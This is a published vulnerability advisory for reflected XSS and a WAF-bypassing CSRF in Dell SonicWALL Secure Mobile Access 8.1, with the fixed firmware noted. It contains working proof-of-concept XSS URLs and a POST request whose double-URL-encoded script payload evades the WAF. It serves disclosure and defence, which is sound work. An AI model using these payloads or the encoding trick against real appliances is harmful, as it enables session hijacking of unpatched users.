@@ -1,0 +1,63 @@
+Dell SonicWALL Secure Mobile Access SMA 8.1 XSS And WAF CSRF
+
+
+Vendor: Dell Inc.
+Product web page: https://www.sonicwall.com/products/secure-mobile-access/
+Affected version: 8.1 (SSL-VPN)
+
+Summary: Keep up with the demands of today’s remote workforce. Enable secure
+mobile access to critical apps and data without compromising security. Choose
+from a variety of scalable secure mobile access (SMA) appliances and intuitive
+Mobile Connect apps to fit every size business and budget.
+
+Desc: SonicWALL SMA suffers from a XSS issue due to a failure to properly sanitize
+user-supplied input to several parameters. Attackers can exploit this weakness
+to execute arbitrary HTML and script code in a user's browser session. The WAF was
+bypassed via form-based CSRF.
+
+Tested on: SonicWALL SSL-VPN Web Server
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2016-5392
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5392.php
+
+Firmware fixed: 8.1.0.3
+Issue ID: 172692
+http://documents.software.dell.com/sonicwall-sma-100-series/8.1.0.3/release-notes/resolved-issues?ParentProduct=869
+
+
+
+26.01.2016
+
+--
+
+
+Reflected XSS via protocol parameter (GET):
+-------------------------------------------
+
+https://127.0.0.1/cgi-bin/ftplauncher?protocol=sftp:</script><img%20src=a%20onerror=confirm(1)>&bmId=55
+
+
+XSS via arbitrary parameter (GET):
+----------------------------------
+
+https://127.0.0.1/cgi-bin/handleWAFRedirect?hdl=VqjLncColvAAAF4QB2YAAAAT&<script>alert(2)</script>=zsl
+
+
+XSS via REMOTEPATH parameter (GET):
+-----------------------------------
+
+https://127.0.0.1/cgi-bin/soniclauncher?REMOTEPATH=//servername/share/</script><img%20src=a%20onerror=confirm(3)>&bmId=59
+
+
+WAF Cross-Site Request Forgery PoC:
+-----------------------------------
+
+POST /cgi-bin/editBookmark HTTP/1.1
+Host: 127.0.0.1
+
+bmName=%2522%253e%253c%2573%2563%2572%2569%2570%2574%253e%2561%256c%2565%2572%2574%2528%2533%2529%253c%252f%2573%2563%2572%2569%2570%2574%253e%250a&host=2&description=3&tabs=4&service=HTTP&screenSize=4&screenSizeHtml5=4&colorSize=3&macAddr=&wolTime=90&apppath=&folder=&appcmdline=&tsfarmserverlist=&langsel=1&redirectclipboard=on&displayconnectionbar=on&autoreconnection=on&bitmapcache=on&themes=on&rdpCompression=on&audiomode=3&rdpExperience=1&rdpServerAuthFailAction=2&charset=UTF-8&sshKeyFile=&defaultWindowSize=1&kexAlgoList=0%2C1%2C2&cipherAlgoList=&hmacAlgoList=&citrixWindowSize=1&citrixWindowWidth=0&citrixWindowHeight=0&citrixWindowPercentage=0&citrixLaunchMethod=Auto&forceInstalledCheckbox=on&icaAddr=&vncEncoding=0&vncCompression=0&vncCursorShapeUpdates=0&vncUseCopyrect=on&vncRestrictedColors=on&vncShareDesktop=on&MC_App=inherit&MC_Copy=inherit&MC_Print=inherit&MC_Offline=inherit&name=1%22+javascript%3Aconfirm(251)%3B&type=user&owner=zslab&cmd=edit&parentBmId=0&ownerdomain=ZSLAB&serviceManualConfigList=undefined&wantBmData=true&swcctn=1NcP8JhUY10emue9YQpON1p2c%3D6P0c9P&ok=OK
